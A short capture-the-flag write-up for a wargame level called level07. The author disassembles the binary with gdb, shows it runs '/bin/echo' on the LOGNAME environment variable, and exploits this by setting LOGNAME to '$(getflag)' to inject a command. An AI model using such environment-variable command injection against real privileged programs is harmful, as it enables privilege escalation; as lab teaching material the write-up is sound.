## level07

There is a level07 executable that displays "level07".

I used gdb to disassemble the program:

```
gdb ./level07
disass main
```

```
[...]
0x0804856f <+91>:    movl   $0x8048680,(%esp)               // x/s 0x8048680: LOGNAME
0x08048576 <+98>:    call   0x8048400 <getenv@plt>
0x0804857b <+103>:   mov    %eax,0x8(%esp)
0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)            // x/s 0x8048688: "/bin/echo %s "
0x08048587 <+115>:   lea    0x14(%esp),%eax
0x0804858b <+119>:   mov    %eax,(%esp)
0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
[...]
```

It is clear that the program makes a call to getenv to get the value of the environment variable LOGNAME, and then display it with /bin/echo.

Not surprisingly, the environment variable LOGNAM is currently equal to 'level07'. All I need to do is change the LOGNAME environment variable so that the program displays what I want.

`export 'LOGNAME=$(getflag)' ; ./level07` and it's done.